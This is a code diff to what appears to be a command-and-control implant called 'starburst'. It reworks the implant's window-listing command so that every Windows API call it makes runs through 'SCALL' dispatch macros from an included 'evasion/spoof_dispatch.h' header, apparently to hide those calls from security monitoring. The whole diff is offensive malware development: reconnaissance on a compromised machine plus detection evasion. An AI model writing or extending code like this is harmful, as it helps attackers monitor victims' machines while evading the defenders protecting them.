@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_WINDOWS
 
@@ -30,14 +31,14 @@ static BOOL CALLBACK declfn window_enum_callback( HWND hwnd, LPARAM lp ) {
     auto ctx = reinterpret_cast<WindowEnumCtx*>( lp );
     if ( !ctx || ctx->off + 320 >= ctx->cap ) return FALSE;
 
-    if ( !ctx->pIsWindowVisible( hwnd ) ) return TRUE;
+    if ( !(BOOL)SCALL_PTR( *ctx->inst, ctx->pIsWindowVisible, hwnd ) ) return TRUE;
 
     wchar_t title_w[256] = { 0 };
-    int title_len = ctx->pGetWindowTextW( hwnd, title_w, 255 );
+    int title_len = (int)SCALL_PTR( *ctx->inst, ctx->pGetWindowTextW, hwnd, title_w, 255 );
     if ( title_len <= 0 ) return TRUE;
 
     DWORD pid = 0;
-    ctx->pGetWindowThreadProcessId( hwnd, &pid );
+    SCALL_PTR( *ctx->inst, ctx->pGetWindowThreadProcessId, hwnd, &pid );
 
     // HWND value
     char num[20];
@@ -75,7 +76,7 @@ static BOOL CALLBACK declfn window_enum_callback( HWND hwnd, LPARAM lp ) {
 
     // title (wide to narrow)
     char title[260] = { 0 };
-    ctx->inst->kernel32.WideCharToMultiByte( CP_ACP, 0, title_w, -1, title, 260, nullptr, nullptr );
+    SCALL( *ctx->inst, kernel32.WideCharToMultiByte, CP_ACP, 0, title_w, -1, title, 260, nullptr, nullptr );
     uint32_t tlen = str_len( title );
     if ( ctx->off + tlen + 2 < ctx->cap ) {
         memory::copy( ctx->buf + ctx->off, title, tlen );
@@ -94,7 +95,7 @@ auto declfn starburst::cmd_windows(
     (void)params;
 
     STK_USER32(_n);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
+    auto h_user32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -141,7 +142,7 @@ auto declfn starburst::cmd_windows(
     ctx.pGetWindowTextW           = pGetWindowTextW;
     ctx.pGetWindowThreadProcessId = pGetWindowThreadProcessId;
 
-    pEnumWindows( window_enum_callback, reinterpret_cast<LPARAM>( &ctx ) );
+    SCALL_PTR( inst, pEnumWindows, window_enum_callback, reinterpret_cast<LPARAM>( &ctx ) );
 
     output[ctx.off] = '\0';
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
